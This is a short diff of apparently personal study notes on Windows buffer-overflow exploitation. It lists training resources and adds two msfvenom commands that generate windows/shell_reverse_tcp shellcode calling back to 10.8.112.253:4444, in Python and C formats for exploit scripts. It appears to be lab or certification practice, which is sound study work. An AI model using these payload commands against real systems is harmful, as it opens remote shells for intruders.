@@ -6,3 +6,17 @@ see: redseigecast BOF101 pdf  and TCM BOF YT
 https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
 
 Pentester academy win32 BOF
+
+see: hacking article BOF tuts
+
+
+While using exploit.py, 
+use 
+
+=> msfvenom -p windows/shell_reverse_tcp LHOST=10.8.112.253 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f py
+
+While using exploit.c
+
+use
+
+=> msfvenom -p windows/shell_reverse_tcp LHOST=10.8.112.253 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
